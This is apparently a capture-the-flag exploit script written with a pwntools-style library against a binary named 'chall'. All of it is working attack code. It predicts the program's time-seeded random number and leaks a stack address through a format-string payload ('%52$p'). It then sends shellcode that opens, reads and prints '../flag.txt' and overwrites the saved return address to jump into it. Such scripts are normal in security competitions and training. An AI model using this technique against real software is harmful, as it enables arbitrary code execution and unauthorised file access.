#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
import ctypes
from time import sleep

context.update(
    log_level='debug',
    binary=ELF('./chall', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = ctypes.CDLL(None)

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x13B8
brva 0x13DB
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal = ['tmux', 'splitw', '-h', '-l', '175', '-P', "-d"]) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def rand():
    return libc.rand()

# ==================== EXPLOIT ====================
p = start()

libc.srand(int(time.time()))
sleep(1)
nhonks = rand() % 91 + 10

sla(b'> ', b'Kaiz0r')

sla(b'honks', str(nhonks).encode())

payload = b'%52$p'
sla(b'again?', payload)

ru(b'wow ')
stack_leak = int(ru(b' you', drop=True), 16)
success(f'Stack leak: {hex(stack_leak)}')

shellcode = shellcraft.open('../flag.txt\0', 0)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

payload = asm(shellcode)
payload = payload.ljust(0x178, b'\0') + p64(stack_leak - 0x190)

sleep(1)
s(payload)

interactive(flag=False)
